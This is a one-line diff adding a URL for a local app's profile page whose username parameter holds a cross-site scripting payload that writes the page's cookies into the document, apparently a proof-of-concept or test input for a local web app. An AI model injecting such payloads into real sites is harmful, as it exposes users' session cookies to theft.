@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=<script>document.write(document.cookie)</script>
